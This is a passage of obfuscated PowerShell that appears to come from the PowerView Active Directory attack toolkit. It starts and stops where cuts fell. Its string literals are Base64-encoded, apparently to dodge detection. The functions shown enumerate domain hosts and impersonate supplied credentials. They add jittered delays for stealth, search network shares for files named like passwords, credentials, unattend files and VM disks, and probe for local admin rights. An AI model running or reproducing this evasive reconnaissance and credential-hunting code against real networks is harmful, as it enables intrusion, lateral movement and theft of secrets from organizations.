            $ScriptParams = @{
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3RhcnRUaW1l"))) = $StartTime
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RW5kVGltZQ=="))) = $EndTime
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWF4RXZlbnRz"))) = $MaxEvents
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGFyZ2V0VXNlcnM="))) = $TargetUsers
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RmlsdGVy"))) = $Filter
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA=="))) = $Credential
            }

            
            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }
}


function Find-DomainShare {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ShareInfo')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $ComputerName,

        [ValidateNotNullOrEmpty()]
        [Alias('Domain')]
        [String]
        $ComputerDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $ComputerOperatingSystem,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $ComputerServicePack,

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $ComputerSiteName,

        [Alias('CheckAccess')]
        [Switch]
        $CheckShareAccess,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,

        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )

    BEGIN {

        $ComputerSearcherArguments = @{
            'Properties' = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZG5zaG9zdG5hbWU=")))
        }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJEb21haW4=")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $ComputerDomain }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJMREFQRmlsdGVy")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))] = $ComputerLDAPFilter }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJTZWFyY2hCYXNl")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $ComputerSearchBase }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VW5jb25zdHJhaW5lZA==")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VW5jb25zdHJhaW5lZA==")))] = $Unconstrained }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJPcGVyYXRpbmdTeXN0ZW0=")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T3BlcmF0aW5nU3lzdGVt")))] = $OperatingSystem }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJTZXJ2aWNlUGFjaw==")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmljZVBhY2s=")))] = $ServicePack }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJTaXRlTmFtZQ==")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2l0ZU5hbWU=")))] = $SiteName }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }

        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l")))]) {
            $TargetComputers = $ComputerName
        }
        else {
            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluU2hhcmVdIFF1ZXJ5aW5nIGNvbXB1dGVycyBpbiB0aGUgZG9tYWlu")))
            $TargetComputers = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluU2hhcmVdIFRhcmdldENvbXB1dGVycyBsZW5ndGg6IHswfQ=="))) -f $($TargetComputers.Length))
        if ($TargetComputers.Length -eq 0) {
            throw ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluU2hhcmVdIE5vIGhvc3RzIGZvdW5kIHRvIGVudW1lcmF0ZQ==")))
        }

        
        $HostEnumBlock = {
            Param($ComputerName, $CheckShareAccess, $TokenHandle)

            if ($TokenHandle) {
                
                $Null = Invoke-UserImpersonation -TokenHandle $TokenHandle -Quiet
            }

            ForEach ($TargetComputer in $ComputerName) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                if ($Up) {
                    
                    $Shares = Get-NetShare -ComputerName $TargetComputer
                    ForEach ($Share in $Shares) {
                        $ShareName = $Share.Name
                        
                        $Path = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFw=")))+$TargetComputer+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA==")))+$ShareName

                        if (($ShareName) -and ($ShareName.trim() -ne '')) {
                            
                            if ($CheckShareAccess) {
                                
                                try {
                                    $Null = [IO.Directory]::GetFiles($Path)
                                    $Share
                                }
                                catch {
                                    Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXJyb3IgYWNjZXNzaW5nIHNoYXJlIHBhdGggJFBhdGggOiB7MH0="))) -f $_)
                                }
                            }
                            else {
                                $Share
                            }
                        }
                    }
                }
            }

            if ($TokenHandle) {
                Invoke-RevertToSelf
            }
        }

        $LogonToken = $Null
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) {
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGVsYXk=")))] -or $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3RvcE9uU3VjY2Vzcw==")))]) {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential
            }
            else {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential -Quiet
            }
        }
    }

    PROCESS {
        
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGVsYXk=")))] -or $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3RvcE9uU3VjY2Vzcw==")))]) {

            Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluU2hhcmVdIFRvdGFsIG51bWJlciBvZiBob3N0czogezB9"))) -f $($TargetComputers.count))
            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluU2hhcmVdIERlbGF5OiAkRGVsYXksIEppdHRlcjogJEppdHRlcg==")))
            $Counter = 0
            $RandNo = New-Object System.Random

            ForEach ($TargetComputer in $TargetComputers) {
                $Counter = $Counter + 1

                
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluU2hhcmVdIEVudW1lcmF0aW5nIHNlcnZlciAkVGFyZ2V0Q29tcHV0ZXIgKCRDb3VudGVyIG9mIHswfSk="))) -f $($TargetComputers.count))
                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $CheckShareAccess, $LogonToken
            }
        }
        else {
            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluU2hhcmVdIFVzaW5nIHRocmVhZGluZyB3aXRoIHRocmVhZHM6ICRUaHJlYWRz")))

            
            $ScriptParams = @{
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q2hlY2tTaGFyZUFjY2Vzcw=="))) = $CheckShareAccess
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9rZW5IYW5kbGU="))) = $LogonToken
            }

            
            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Find-InterestingDomainShareFile {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FoundFile')]
    [CmdletBinding(DefaultParameterSetName = 'FileSpecification')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $ComputerName,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $ComputerOperatingSystem,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $ComputerServicePack,

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $ComputerSiteName,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [Alias('SearchTerms', 'Terms')]
        [String[]]
        $Include = @('*password*', '*sensitive*', '*admin*', '*login*', '*secret*', 'unattend*.xml', '*.vmdk', '*creds*', '*credential*', '*.config'),

        [ValidateNotNullOrEmpty()]
        [ValidatePattern('\\\\')]
        [Alias('Share')]
        [String[]]
        $SharePath,

        [String[]]
        $ExcludedShares = @('C$', 'Admin$', 'Print$', 'IPC$'),

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $LastAccessTime,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $LastWriteTime,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $CreationTime,

        [Parameter(ParameterSetName = 'OfficeDocs')]
        [Switch]
        $OfficeDocs,

        [Parameter(ParameterSetName = 'FreshEXEs')]
        [Switch]
        $FreshEXEs,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,

        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )

    BEGIN {
        $ComputerSearcherArguments = @{
            'Properties' = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZG5zaG9zdG5hbWU=")))
        }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJEb21haW4=")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $ComputerDomain }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJMREFQRmlsdGVy")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))] = $ComputerLDAPFilter }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJTZWFyY2hCYXNl")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $ComputerSearchBase }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJPcGVyYXRpbmdTeXN0ZW0=")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T3BlcmF0aW5nU3lzdGVt")))] = $OperatingSystem }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJTZXJ2aWNlUGFjaw==")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmljZVBhY2s=")))] = $ServicePack }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJTaXRlTmFtZQ==")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2l0ZU5hbWU=")))] = $SiteName }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }

        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l")))]) {
            $TargetComputers = $ComputerName
        }
        else {
            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtSW50ZXJlc3RpbmdEb21haW5TaGFyZUZpbGVdIFF1ZXJ5aW5nIGNvbXB1dGVycyBpbiB0aGUgZG9tYWlu")))
            $TargetComputers = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtSW50ZXJlc3RpbmdEb21haW5TaGFyZUZpbGVdIFRhcmdldENvbXB1dGVycyBsZW5ndGg6IHswfQ=="))) -f $($TargetComputers.Length))
        if ($TargetComputers.Length -eq 0) {
            throw ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtSW50ZXJlc3RpbmdEb21haW5TaGFyZUZpbGVdIE5vIGhvc3RzIGZvdW5kIHRvIGVudW1lcmF0ZQ==")))
        }

        
        $HostEnumBlock = {
            Param($ComputerName, $Include, $ExcludedShares, $OfficeDocs, $ExcludeHidden, $FreshEXEs, $CheckWriteAccess, $TokenHandle)

            if ($TokenHandle) {
                
                $Null = Invoke-UserImpersonation -TokenHandle $TokenHandle -Quiet
            }

            ForEach ($TargetComputer in $ComputerName) {

                $SearchShares = @()
                if ($TargetComputer.StartsWith(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFw="))))) {
                    
                    $SearchShares += $TargetComputer
                }
                else {
                    $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                    if ($Up) {
                        
                        $Shares = Get-NetShare -ComputerName $TargetComputer
                        ForEach ($Share in $Shares) {
                            $ShareName = $Share.Name
                            $Path = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFw=")))+$TargetComputer+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA==")))+$ShareName
                            
                            if (($ShareName) -and ($ShareName.Trim() -ne '')) {
                                
                                if ($ExcludedShares -NotContains $ShareName) {
                                    
                                    try {
                                        $Null = [IO.Directory]::GetFiles($Path)
                                        $SearchShares += $Path
                                    }
                                    catch {
                                        Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WyFdIE5vIGFjY2VzcyB0byAkUGF0aA==")))
                                    }
                                }
                            }
                        }
                    }
                }

                ForEach ($Share in $SearchShares) {
                    Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoaW5nIHNoYXJlOiAkU2hhcmU=")))
                    $SearchArgs = @{
                        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UGF0aA=="))) = $Share
                        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SW5jbHVkZQ=="))) = $Include
                    }
                    if ($OfficeDocs) {
                        $SearchArgs[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2ZmaWNlRG9jcw==")))] = $OfficeDocs
                    }
                    if ($FreshEXEs) {
                        $SearchArgs[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RnJlc2hFWEVz")))] = $FreshEXEs
                    }
                    if ($LastAccessTime) {
                        $SearchArgs[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TGFzdEFjY2Vzc1RpbWU=")))] = $LastAccessTime
                    }
                    if ($LastWriteTime) {
                        $SearchArgs[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TGFzdFdyaXRlVGltZQ==")))] = $LastWriteTime
                    }
                    if ($CreationTime) {
                        $SearchArgs[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlYXRpb25UaW1l")))] = $CreationTime
                    }
                    if ($CheckWriteAccess) {
                        $SearchArgs[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q2hlY2tXcml0ZUFjY2Vzcw==")))] = $CheckWriteAccess
                    }
                    Find-InterestingFile @SearchArgs
                }
            }

            if ($TokenHandle) {
                Invoke-RevertToSelf
            }
        }

        $LogonToken = $Null
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) {
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGVsYXk=")))] -or $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3RvcE9uU3VjY2Vzcw==")))]) {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential
            }
            else {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential -Quiet
            }
        }
    }

    PROCESS {
        
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGVsYXk=")))] -or $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3RvcE9uU3VjY2Vzcw==")))]) {

            Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtSW50ZXJlc3RpbmdEb21haW5TaGFyZUZpbGVdIFRvdGFsIG51bWJlciBvZiBob3N0czogezB9"))) -f $($TargetComputers.count))
            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtSW50ZXJlc3RpbmdEb21haW5TaGFyZUZpbGVdIERlbGF5OiAkRGVsYXksIEppdHRlcjogJEppdHRlcg==")))
            $Counter = 0
            $RandNo = New-Object System.Random

            ForEach ($TargetComputer in $TargetComputers) {
                $Counter = $Counter + 1

                
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtSW50ZXJlc3RpbmdEb21haW5TaGFyZUZpbGVdIEVudW1lcmF0aW5nIHNlcnZlciAkVGFyZ2V0Q29tcHV0ZXIgKCRDb3VudGVyIG9mIHswfSk="))) -f $($TargetComputers.count))
                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $Include, $ExcludedShares, $OfficeDocs, $ExcludeHidden, $FreshEXEs, $CheckWriteAccess, $LogonToken
            }
        }
        else {
            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtSW50ZXJlc3RpbmdEb21haW5TaGFyZUZpbGVdIFVzaW5nIHRocmVhZGluZyB3aXRoIHRocmVhZHM6ICRUaHJlYWRz")))

            
            $ScriptParams = @{
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SW5jbHVkZQ=="))) = $Include
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXhjbHVkZWRTaGFyZXM="))) = $ExcludedShares
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2ZmaWNlRG9jcw=="))) = $OfficeDocs
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXhjbHVkZUhpZGRlbg=="))) = $ExcludeHidden
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RnJlc2hFWEVz"))) = $FreshEXEs
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q2hlY2tXcml0ZUFjY2Vzcw=="))) = $CheckWriteAccess
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9rZW5IYW5kbGU="))) = $LogonToken
            }

            
            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Find-LocalAdminAccess {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $ComputerName,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $ComputerOperatingSystem,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $ComputerServicePack,

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $ComputerSiteName,

        [Switch]
        $CheckShareAccess,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,

        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )

    BEGIN {
        $ComputerSearcherArguments = @{
            'Properties' = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZG5zaG9zdG5hbWU=")))
        }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJEb21haW4=")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $ComputerDomain }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJMREFQRmlsdGVy")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))] = $ComputerLDAPFilter }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJTZWFyY2hCYXNl")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $ComputerSearchBase }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VW5jb25zdHJhaW5lZA==")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VW5jb25zdHJhaW5lZA==")))] = $Unconstrained }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJPcGVyYXRpbmdTeXN0ZW0=")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T3BlcmF0aW5nU3lzdGVt")))] = $OperatingSystem }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJTZXJ2aWNlUGFjaw==")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmljZVBhY2s=")))] = $ServicePack }
